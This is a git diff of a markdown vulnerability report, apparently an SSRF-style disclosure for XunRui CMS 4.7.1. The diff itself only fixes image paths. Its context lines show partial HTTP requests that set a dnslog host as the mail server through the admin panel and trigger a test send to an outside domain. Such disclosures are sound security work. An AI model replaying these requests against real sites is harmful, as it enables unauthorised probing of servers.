@@ -20,9 +20,9 @@ In System - Email Settings - Add
 
 Required fields in the red box
 
-![image-20251111154906248](.\img\2.png)
+![image-20251111154906248](./img/2.png)
 
-![image-20251111154906248](.\img\4.png)
+![image-20251111154906248](./img/4.png)
 
 ```
 POST /admind45f74adbd95.php?c=email&m=add HTTP/1.1
@@ -45,11 +45,11 @@ is_form=1&is_admin=1&is_tips=&_token=CMF548bfec&type=0&data%5Bhost%5D=m4zyp1.dns
 点击测试发送
 Click to test and send
 
-![image-20251111154906248](.\img\3.png)
+![image-20251111154906248](./img/3.png)
 
-![image-20251111154906248](.\img\5.png)
+![image-20251111154906248](./img/5.png)
 
-![image-20251111154906248](.\img\6.png)
+![image-20251111154906248](./img/6.png)
 
 ```
 GET /admind45f74adbd95.php?c=api&m=email_test&id=2&0.6983572944272666 HTTP/1.1
@@ -68,7 +68,7 @@ Connection: close
 
 Discovery results received dnslog
 
-![image-20251111154906248](.\img\7.png)
+![image-20251111154906248](./img/7.png)
 
 ## version
 
@@ -79,5 +79,6 @@ Vulnerabilities affect versions
 | 迅睿CMS-ThinkPHP版安装包    | 4.7.1 | 2025-11-11 |
 
 | 迅睿CMS-CodeIgniter版安装包 | 4.7.1 | 2025-11-11 |
+
 
 
